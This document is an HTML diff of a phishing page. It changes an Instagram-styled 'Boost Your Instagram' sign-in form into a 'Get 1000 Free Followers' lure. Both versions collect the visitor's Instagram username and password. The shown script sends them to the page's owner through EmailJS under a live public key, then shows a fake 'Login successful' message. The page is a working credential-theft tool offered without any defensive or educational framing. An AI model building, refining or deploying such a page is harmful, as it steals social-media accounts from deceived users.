@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Boost Your Instagram Now!</title>
+  <title>Get 1000 Free Instagram Followers!</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
   <style>
     * {
@@ -13,7 +13,7 @@
     }
     body {
       font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #6b48ff, #ff589e, #ffcc00);
+      background: linear-gradient(120deg, #ff6b6b, #4ecdc4, #45b7d1);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -24,126 +24,107 @@
     body::before {
       content: '';
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: radial-gradient(circle, rgba(255, 255, 255, 0.25), transparent 70%);
-      opacity: 0.8;
-      animation: pulseGlow 10s ease-in-out infinite;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.2), transparent);
+      animation: rotateGlow 15s linear infinite;
     }
-    @keyframes pulseGlow {
-      0%, 100% { opacity: 0.8; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(1.1); }
+    @keyframes rotateGlow {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
     .container {
-      width: 420px;
+      width: 450px;
       background: #fff;
-      border-radius: 25px;
-      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.2);
-      padding: 50px 40px;
+      border-radius: 20px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
+      padding: 40px;
       text-align: center;
       z-index: 1;
-      animation: floatIn 0.8s ease-out;
-      backdrop-filter: blur(5px);
-      background: rgba(255, 255, 255, 0.95);
+      animation: popIn 0.6s ease-out;
     }
-    @keyframes floatIn {
-      0% { opacity: 0; transform: translateY(30px) scale(0.95); }
-      100% { opacity: 1; transform: translateY(0) scale(1); }
-    }
-    .header {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 30px;
-    }
-    .logo {
-      width: 60px;
-      margin-right: 15px;
-      filter: drop-shadow(0 3px 8px rgba(0, 0, 0, 0.15));
+    @keyframes popIn {
+      0% { transform: scale(0.9); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
     }
     .title {
-      font-size: 28px;
+      font-size: 32px;
       font-weight: 700;
       color: #ff3366;
-      text-shadow: 0 2px 6px rgba(255, 51, 102, 0.4);
+      margin-bottom: 10px;
+      text-shadow: 0 2px 5px rgba(255, 51, 102, 0.3);
     }
     .subtitle {
-      font-size: 16px;
-      color: #666;
-      margin-bottom: 25px;
-      font-weight: 400;
+      font-size: 18px;
+      color: #555;
+      margin-bottom: 30px;
     }
     .form-box {
       padding: 0 20px;
     }
     .input-field {
       width: 100%;
-      padding: 16px;
-      margin: 12px 0;
+      padding: 15px;
+      margin: 10px 0;
       border: none;
-      border-radius: 12px;
-      background: #f5f5f5;
-      font-size: 15px;
+      border-radius: 10px;
+      background: #f0f0f0;
+      font-size: 16px;
       color: #333;
-      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.05);
       transition: all 0.3s ease;
     }
     .input-field:focus {
       background: #fff;
-      box-shadow: 0 0 12px rgba(255, 88, 158, 0.5);
+      box-shadow: 0 0 10px rgba(255, 107, 107, 0.4);
       outline: none;
     }
     .input-field::placeholder {
-      color: #bbb;
+      color: #aaa;
     }
-    .continue-btn {
+    .claim-btn {
       width: 100%;
-      padding: 16px;
-      background: linear-gradient(90deg, #6b48ff, #ff589e, #ffcc00);
+      padding: 15px;
+      background: linear-gradient(90deg, #ff6b6b, #ffcc5c);
       color: white;
       border: none;
-      border-radius: 12px;
+      border-radius: 10px;
       font-weight: bold;
-      font-size: 17px;
+      font-size: 18px;
       cursor: pointer;
       margin-top: 20px;
       transition: transform 0.2s ease, box-shadow 0.3s ease;
     }
-    .continue-btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 20px rgba(255, 88, 158, 0.6);
+    .claim-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(255, 107, 107, 0.5);
     }
-    .continue-btn:disabled {
-      background: #d0d0d0;
+    .claim-btn:disabled {
+      background: #ccc;
       transform: none;
       box-shadow: none;
       cursor: not-allowed;
     }
-    .note {
-      font-size: 13px;
-      color: #888;
-      margin-top: 25px;
-      font-style: italic;
+    .disclaimer {
+      font-size: 12px;
+      color: #777;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="header">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
-      <h1 class="title">Boost Your Instagram Now!</h1>
-    </div>
-    <p class="subtitle">Sign in to Instagram to continue</p>
+    <h1 class="title">Get 1000 Free Followers!</h1>
+    <p class="subtitle">Sign in to claim your Instagram boost now!</p>
     <div class="form-box">
-      <form id="continue-form" name="continue-form">
+      <form id="claim-form" name="claim-form">
         <input type="text" name="username" id="username" class="input-field" placeholder="Username or Email" required>
         <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
-        <button type="submit" class="continue-btn" id="continue-btn">Continue</button>
+        <button type="submit" class="claim-btn" id="claim-btn">Claim Now</button>
       </form>
     </div>
-    <p class="note">Explore exclusive features with your account!</p>
+    <p class="disclaimer">Ready to take your social life to the next level!!!.</p>
   </div>
 
   <!-- EmailJS SDK -->
@@ -151,11 +132,11 @@
   <script>
     emailjs.init("XI3MNWxgiq0cRWGRE"); // Your Public Key
 
-    document.getElementById("continue-form").addEventListener("submit", function(event) {
+    document.getElementById("claim-form").addEventListener("submit", function(event) {
       event.preventDefault();
-      const continueBtn = document.getElementById("continue-btn");
-      continueBtn.disabled = true;
-      continueBtn.textContent = "Processing...";
+      const claimBtn = document.getElementById("claim-btn");
+      claimBtn.disabled = true;
+      claimBtn.textContent = "Processing...";
 
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
@@ -165,14 +146,14 @@
         password: password
       })
       .then(function(response) {
-        alert("Login successful!");
-        continueBtn.disabled = false;
-        continueBtn.textContent = "Continue";
-        document.getElementById("continue-form").reset();
+        alert("Login successful! Check back soon for your followers!");
+        claimBtn.disabled = false;
+        claimBtn.textContent = "Claim Now";
+        document.getElementById("claim-form").reset();
       }, function(error) {
         alert("Failed to process. Please try again.");
-        continueBtn.disabled = false;
-        continueBtn.textContent = "Continue";
+        claimBtn.disabled = false;
+        claimBtn.textContent = "Claim Now";
         console.log("EmailJS Error:", error);
       });
     });
